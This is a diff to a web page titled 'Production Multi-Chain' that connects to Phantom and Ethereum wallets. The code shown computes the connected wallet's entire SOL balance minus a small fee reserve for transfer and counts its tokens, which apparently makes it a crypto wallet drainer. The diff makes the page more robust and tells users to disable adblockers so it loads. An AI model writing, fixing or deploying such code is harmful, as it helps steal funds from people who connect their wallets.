@@ -1,13 +1,13 @@
-<!DOCTYPE html>
+  <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Production Multi-Chain</title>
   
-  <!-- Web3 Engine Libraries -->
+  <!-- Web3 Engine Libraries (Updated & Stable CDN Links) -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.11.1/dist/ethers.umd.min.js"></script>
-  <script src="https://unpkg.com/@solana/web3.js@1.90.0/lib/index.iife.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.8/lib/index.iife.min.js"></script>
   
   <style>
@@ -216,14 +216,24 @@
 
     // SOLANA ROUTINE
     if (network === "solana") {
-      if (typeof solanaWeb3 === "undefined" || typeof splToken === "undefined") {
-        setStatus("❌ <b>Library Error:</b> Solana libraries failed to load from CDN.", "error");
+      // Safely check for missing dependencies on the global window object
+      if (typeof window.solanaWeb3 === "undefined") {
+        setStatus("❌ <b>Library Error:</b> @solana/web3.js failed to load. Check internet connection or disable adblockers.", "error");
+        return;
+      }
+      
+      if (typeof window.splToken === "undefined") {
+        setStatus("❌ <b>Library Error:</b> @solana/spl-token failed to load. Check internet connection or disable adblockers.", "error");
         return;
       }
 
+      // Alias variables safely from window scope
+      const solanaWeb3 = window.solanaWeb3;
+      const splToken = window.splToken;
+
       const provider = window.solana;
       if (!provider || !provider.isPhantom) {
-        setStatus("❌ <b>Wallet Error:</b> Phantom extension/app not detected.", "error");
+        setStatus("❌ <b>Wallet Error:</b> Phantom extension or in-app browser not detected.", "error");
         return;
       }
 
@@ -284,7 +294,7 @@
         }
 
         const totalSolBalance = await connection.getBalance(sender);
-        const reservedGas = 2000000; 
+        const reservedGas = 2000000; // Reserve 0.002 SOL for fee
         const solToTransfer = totalSolBalance - reservedGas;
 
         if (totalSolBalance === 0 && activeTokens === 0) {
@@ -410,7 +420,7 @@
     } catch (err) {
       console.error(err);
       if (err.code === "ACTION_REJECTED" || err.message?.includes("user rejected")) {
-        setStatus("⚠️️ <b>Cancelled:</b> Transaction declined by user.", "error");
+        setStatus("⚠ <b>Cancelled:</b> Transaction declined by user.", "error");
       } else {
         setStatus(`❌ <b>Execution Failed:</b> ${err.reason || err.message}`, "error");
       }
